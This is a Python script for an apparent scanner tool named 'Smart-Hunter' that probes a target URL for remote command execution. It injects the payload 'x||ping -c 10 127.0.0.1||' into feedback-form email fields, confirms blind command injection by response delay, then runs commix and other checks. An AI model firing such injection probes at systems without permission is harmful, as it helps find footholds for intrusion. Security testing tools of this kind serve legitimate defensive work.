import os
import sys
import argparse
import time

# Add the project root and necessary subdirectories to sys.path to allow importing from top-level packages
root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
for p in [
    root,
    os.path.join(root, "Logic"),
    os.path.join(root, "Logic", "Recon"),
    os.path.join(root, "Logic", "vulnerability_scan"),
    os.path.join(root, "Data"),
]:
    if p not in sys.path:
        sys.path.append(p)

from vulnerability_scan.Scanner_vulnerability import URLVulnerabilityChecker


def _valid_form_value(name):
    low = (name or "").lower()
    if "email" in low:
        return "scan@example.com"
    if "name" in low:
        return "scanner"
    if "subject" in low or "title" in low:
        return "security-test"
    if any(token in low for token in ("message", "comment", "feedback", "body", "content")):
        return "security test message"
    if any(token in low for token in ("url", "uri", "link")):
        return "https://example.com"
    return "test"


def _normalize_feedback_defaults(target):
    defaults = dict(target.get("defaults") or {})
    for param in target.get("params") or []:
        if param.lower() == "csrf":
            continue
        if defaults.get(param) in (None, "", "FUZZ"):
            defaults[param] = _valid_form_value(param)
    return defaults


def _send_timed_post(checker, url, data, timeout=35):
    started = time.perf_counter()
    response = checker._make_request(url, method="post", data=data, timeout=timeout)
    elapsed = time.perf_counter() - started
    status = response.status_code if response is not None else "ERR"
    return response, elapsed, status


def _targeted_feedback_rce_probe(checker, targets):
    """Fast path for feedback forms where blind RCE is usually on email."""
    post_targets = (targets or {}).get("post", [])
    candidates = [
        target for target in post_targets
        if "email" in [p.lower() for p in target.get("params", [])]
    ]
    if not candidates:
        return []

    print("\n[+] Starting Phase 1B: Targeted feedback-form RCE probe...")
    findings = []
    payload = "x||ping -c 10 127.0.0.1||"
    threshold = 7.0

    for target in candidates:
        turl = target["url"]
        page_url = target.get("page_url") or turl
        defaults = _normalize_feedback_defaults(target)

        try:
            baseline_data = checker._refresh_csrf(page_url, defaults.copy())
        except Exception:
            baseline_data = defaults.copy()

        _, baseline_elapsed, baseline_status = _send_timed_post(checker, turl, baseline_data)
        print(f"    [*] Baseline POST -> {baseline_status} ({baseline_elapsed:.2f}s)")

        control_data = dict(baseline_data)
        control_data["email"] = "scan@example.com"

        attack_data = dict(baseline_data)
        attack_data["email"] = payload
        _, attack_elapsed, attack_status = _send_timed_post(checker, turl, attack_data)
        print(f"    [*] Probe email={payload!r} -> {attack_status} ({attack_elapsed:.2f}s)")

        _, control_elapsed, control_status = _send_timed_post(checker, turl, control_data)
        print(f"    [*] Control email='scan@example.com' -> {control_status} ({control_elapsed:.2f}s)")

        if attack_elapsed < max(baseline_elapsed, control_elapsed) + threshold:
            continue

        try:
            confirm_data = checker._refresh_csrf(page_url, attack_data.copy())
        except Exception:
            confirm_data = attack_data.copy()
        confirm_data["email"] = payload
        _, confirm_elapsed, confirm_status = _send_timed_post(checker, turl, confirm_data)
        print(f"    [*] Confirm email={payload!r} -> {confirm_status} ({confirm_elapsed:.2f}s)")

        if confirm_elapsed >= max(baseline_elapsed, control_elapsed) + threshold:
            finding = {
                "type": "Command Injection (blind time delay)",
                "parameter": "email",
                "payload": payload,
                "evidence": (
                    f"Repeated delayed feedback form responses: baseline {baseline_elapsed:.2f}s, "
                    f"control {control_elapsed:.2f}s, attack {attack_elapsed:.2f}s, "
                    f"confirm {confirm_elapsed:.2f}s"
                ),
                "tool": "builtin_rce_feedback_probe",
                "confidence": "high",
                "status": "confirmed",
                "url": turl,
                "method": "post",
            }
            checker.vulnerabilities_found.append(finding)
            findings.append(finding)
            print("    [!] RCE CONFIRMED: email blind time-delay payload")
            break

    return findings

def run_standalone_rce(url, cookie=None):
    print(f"\n{'='*60}")
    print(f"      SMART-HUNTER: STANDALONE RCE SCANNER")
    print(f"{'='*60}")
    print(f"[*] Target: {url}")
    
    checker = URLVulnerabilityChecker(cookie=cookie)
    checker.current_target_url = url
    
    # 1. Parameter Discovery
    targets = checker.discover_parameters(url)

    targeted_findings = _targeted_feedback_rce_probe(checker, targets)
    
    # 2. Built-in RCE Checks
    print(f"\n[+] Starting Phase 2: Built-in RCE Checks...")
    if targeted_findings:
        print("    [*] Targeted probe already confirmed RCE; skipping broad built-in RCE fuzz for this run.")
    else:
        checker.check_rce_builtin(url, targets)
    
    # 3. Commix Integration
    print(f"\n[+] Starting Phase 3: Commix Integration...")
    checker.check_command_injection_with_commix(url, targets=targets)
    
    # 4. Final Report
    checker.generate_report(url)
    
    print(f"\n{'='*60}")
    print(f"      SCAN COMPLETE")
    print(f"{'='*60}")

def main():
    target = input("\nEnter URL Target: ").strip()
    if not target: return
    cookie = input("Enter Session Cookie (optional): ").strip()
    run_standalone_rce(target, cookie if cookie else None)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(description="Standalone RCE Scanner")
        parser.add_argument("url", help="Target URL to scan")
        parser.add_argument("--cookie", help="Session cookie (optional)")
        args = parser.parse_args()
        run_standalone_rce(args.url, args.cookie)
    else:
        main()
